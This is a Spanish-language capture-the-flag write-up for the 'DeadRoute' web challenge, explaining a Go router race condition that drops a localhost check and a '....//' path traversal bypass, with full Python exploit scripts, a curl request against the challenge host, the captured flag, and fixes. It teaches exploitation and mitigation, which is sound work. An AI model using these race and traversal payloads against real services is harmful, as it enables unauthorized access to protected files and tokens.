# DeadRoute - HTB University CTF 2025

**Categoría:** Web
**Dificultad:** Easy
**Flag:** `HTB{f1nd_th3_d34d_r0ute_after_w1nning_the_rac3_efa2ff506857e5d4490ddad245e707a5}`

---

## Descripción

DeadRoute es una aplicación web de notas escrita en Go con un router personalizado. El objetivo es leer el archivo `/flag.txt` que está protegido.

## Reconocimiento

### Estructura de la Aplicación

```
src/
├── controllers/
│   ├── admin_controller.go   # Dashboard y login-token
│   ├── auth_controller.go    # Login/Logout
│   └── note_controller.go    # CRUD de notas
├── models/
│   ├── auth.go               # Generación de tokens HMAC
│   ├── middleware.go         # LocalHostOnly, RequireAuth
│   └── router.go             # Router personalizado (VULNERABLE)
├── routes.go                 # Definición de rutas
└── main.go
```

### Rutas Importantes

```go
// Rutas públicas
r.Get("/notes", http.HandlerFunc(noteController.PublicListNotes))
r.Get("/notes/read", http.HandlerFunc(noteController.PublicReadNote))

// Rutas protegidas
r.Get("/admin/notes/read", models.RequireAuth, http.HandlerFunc(noteController.ReadNote))
r.Get("/admin/login-token", models.LocalHostOnly, http.HandlerFunc(adminController.LoginToken))
```

### Observaciones Clave

1. **`/admin/login-token`** - Devuelve el token de autenticación, protegido por `LocalHostOnly`
2. **`/admin/notes/read`** - Tiene path traversal explotable, requiere autenticación
3. **`/notes/read`** - Versión pública, bloquea path traversal con `strings.Contains(noteID, "..")`

---

## Análisis de Vulnerabilidades

### Vulnerabilidad 1: Path Traversal en Admin

En `note_controller.go:99-100`:

```go
// Versión Admin - VULNERABLE
noteID = strings.ReplaceAll(noteID, "../", "")
filePath := filepath.Join(c.notesDir, noteID)
```

El sanitizador solo remueve `../`, pero `....//` se convierte en `../` después del reemplazo:
- Input: `....//....//....//flag.txt`
- Después de ReplaceAll: `../../../flag.txt`
- filepath.Join("notes", "../../../flag.txt") → `/flag.txt`

**Problema:** Requiere autenticación válida.

### Vulnerabilidad 2: Race Condition en Router (CRÍTICA)

En `router.go:85-89`:

```go
func (r *Router) Get(pattern string, h ...Handler) {
    // ...
    r.routes[routeKey] = func(w http.ResponseWriter, req *http.Request) {
        r.mu.RLock()
        mws := r.mws  // ← Copia el HEADER del slice, NO el array subyacente!
        r.mu.RUnlock()
        for _, handler := range h {
            mws = append(mws, getMWFromHandler(handler))  // ← RACE CONDITION!
        }
        // ...
    }
}
```

#### ¿Por qué es vulnerable?

1. Después de registrar 3 middlewares globales, `r.mws` tiene `len=3, cap=4`
2. `mws := r.mws` crea un nuevo header de slice pero apunta al **mismo array**
3. Cuando múltiples requests concurrentes hacen `append`, el primero escribe en `array[3]`
4. Si hay capacidad disponible, **todos escriben en la misma posición de memoria**

#### Escenario de Explotación

```
Request A: /admin/login-token (handlers: [LocalHostOnly, LoginToken])
Request B: /notes (handlers: [PublicHandler])

Tiempo →
────────────────────────────────────────────────────────
Request A: mws := r.mws          [Log, AntiXSS, CSP] (len=3, cap=4)
Request B: mws := r.mws          [Log, AntiXSS, CSP] (len=3, cap=4)
Request A: append(LocalHostOnly) → escribe en array[3]
Request B: append(PublicHandler) → SOBRESCRIBE array[3]!
Request A: append(LoginToken)    → nuevo array (cap agotada)
────────────────────────────────────────────────────────

Resultado para Request A:
Chain: [Log, AntiXSS, CSP, PublicHandler, LoginToken]
       ↑ LocalHostOnly fue reemplazado!
```

El middleware `LocalHostOnly` es reemplazado por `PublicHandler`, y el token se devuelve sin verificar localhost.

---

## Explotación

### Paso 1: Race Condition para Obtener Token

```python
#!/usr/bin/env python3
import requests
import threading
import re

TARGET = "http://154.57.164.82:32249"
token_found = None
lock = threading.Lock()

def request_token():
    global token_found
    try:
        resp = requests.get(f"{TARGET}/admin/login-token", timeout=2)
        # Buscar token en respuesta mixta (HTML + token)
        match = re.search(r'[0-9a-f]{64}', resp.text)
        if match:
            with lock:
                if token_found is None:
                    token_found = match.group(0)
    except:
        pass

def request_public():
    try:
        requests.get(f"{TARGET}/notes", timeout=2)
    except:
        pass

# Lanzar threads concurrentes
threads = []
for _ in range(100):
    t1 = threading.Thread(target=request_token)
    t2 = threading.Thread(target=request_public)
    t1.start()
    t2.start()
    threads.extend([t1, t2])

for t in threads:
    t.join()

print(f"Token: {token_found}")
```

**Output:**
```
Token: SECRET_REDACTED_BY_ANTIGRAVITY306574fca375ce060bc5f764
```

### Paso 2: Path Traversal para Leer Flag

```bash
curl -b "santa_SECRET_REDACTED_BY_ANTIGRAVITY4b586306574fca375ce060bc5f764" \
     "http://154.57.164.82:32249/admin/notes/read?id=....//....//....//flag.txt"
```

**Output:**
```json
{
  "id": "../../../flag.txt",
  "title": "HTB{f1nd_th3_d34d_r0ute_after_w1nning_the_rac3_efa2ff506857e5d4490ddad245e707a5}",
  "content": "",
  "date": "2025-12-19 22:16:16"
}
```

---

## Exploit Completo

```python
#!/usr/bin/env python3
"""
DeadRoute CTF Exploit
Race Condition + Path Traversal
"""

import requests
import threading
import sys
import re
import time

TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:4445"
THREADS = 100
DURATION = 60

token_found = None
lock = threading.Lock()

def request_token():
    global token_found
    try:
        resp = requests.get(f"{TARGET}/admin/login-token", timeout=2)
        if resp.status_code == 200:
            # Token puro (64 chars hex)
            if len(resp.text) == 64 and all(c in '0123456789abcdef' for c in resp.text):
                with lock:
                    if token_found is None:
                        token_found = resp.text
            # Token en respuesta mixta
            else:
                match = re.search(r'[0-9a-f]{64}', resp.text)
                if match:
                    with lock:
                        if token_found is None:
                            token_found = match.group(0)
    except:
        pass

def request_public():
    try:
        requests.get(f"{TARGET}/notes", timeout=2)
    except:
        pass

def worker():
    while token_found is None:
        request_token()
        request_public()

def main():
    global token_found

    print(f"[*] Target: {TARGET}")
    print(f"[*] Starting race condition attack...")

    start = time.time()
    threads = []

    for _ in range(THREADS):
        t = threading.Thread(target=worker, daemon=True)
        t.start()
        threads.append(t)

    while token_found is None and (time.time() - start) < DURATION:
        print(f"\r[*] Elapsed: {int(time.time() - start)}s", end="", flush=True)
        time.sleep(1)

    print()

    if not token_found:
        print("[-] Failed to obtain token")
        sys.exit(1)

    print(f"[+] Token: {token_found}")
    print("[*] Reading flag via path traversal...")

    session = requests.Session()
    session.cookies.set("santa_auth", token_found)

    resp = session.get(f"{TARGET}/admin/notes/read",
                       params={"id": "....//....//....//flag.txt"})

    if resp.status_code == 200:
        data = resp.json()
        flag = data.get('title') or data.get('content')
        print(f"[+] FLAG: {flag}")
    else:
        print(f"[-] Failed: {resp.status_code}")

if __name__ == "__main__":
    main()
```

---

## Mitigación

### Fix para Race Condition

```go
// ANTES (vulnerable)
mws := r.mws

// DESPUÉS (seguro) - Copiar el slice completo
mws := make([]Middleware, len(r.mws))
copy(mws, r.mws)
```

### Fix para Path Traversal

```go
// ANTES (vulnerable)
noteID = strings.ReplaceAll(noteID, "../", "")

// DESPUÉS (seguro) - Usar filepath.Clean y verificar
noteID = filepath.Clean(noteID)
if strings.Contains(noteID, "..") {
    http.Error(w, "Invalid path", http.StatusBadRequest)
    return
}
```

---

## Referencias

- [Go Slice Internals](https://go.dev/blog/slices-intro)
- [Race Conditions in Go](https://go.dev/doc/articles/race_detector)
- [Path Traversal - OWASP](https://owasp.org/www-community/attacks/Path_Traversal)

---

## Flag

```
HTB{f1nd_th3_d34d_r0ute_after_w1nning_the_rac3_efa2ff506857e5d4490ddad245e707a5}
```

**Significado:**
- `f1nd_th3_d34d_r0ute` → Encontrar la ruta "muerta" (middleware corrupto)
- `after_w1nning_the_rac3` → Después de ganar la carrera (race condition)
